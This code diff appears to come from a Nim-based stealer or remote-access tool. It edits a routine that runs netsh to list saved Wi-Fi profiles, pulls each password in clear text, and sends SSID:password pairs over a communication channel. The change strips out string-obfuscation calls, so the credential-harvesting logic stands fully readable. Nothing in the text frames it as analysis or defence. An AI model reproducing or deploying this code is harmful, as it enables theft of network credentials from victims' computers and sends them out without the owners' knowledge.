@@ -12,7 +12,7 @@ from ../channels import mainChannel
 import ../functions/hideString
 
 proc getWifiPasswords(): void =
-  let netshOutout1: string = runCmd d e"netsh wlan show profile"
+  let netshOutout1: string = runCmd "netsh wlan show profile"
 
   for line in netshOutout1.split("\n"):
     let split: seq[string] = line.split(": ")
@@ -20,13 +20,13 @@ proc getWifiPasswords(): void =
     if split.len == 2:
       let SSID: string = split[1]
       let netshOutout2: string = runCmd(
-        d(e("netsh wlan show profile \"")) & SSID & d(e("\" key=clear"))
+        "netsh wlan show profile \"" & SSID & "\" key=clear"
       )
 
       for line in netshOutout2.split("\n"):
-        if line.contains(d e"Key Content"):
+        if line.contains("Key Content"):
           let password: string = line.split(": ")[1]
-          mainChannel.send (d e "wp", encode SSID & ":" & password)
+          mainChannel.send ("wp", encode SSID & ":" & password)
 
 proc initWifiPasswordsThread*(): void {.thread.} =
   getWifiPasswords()
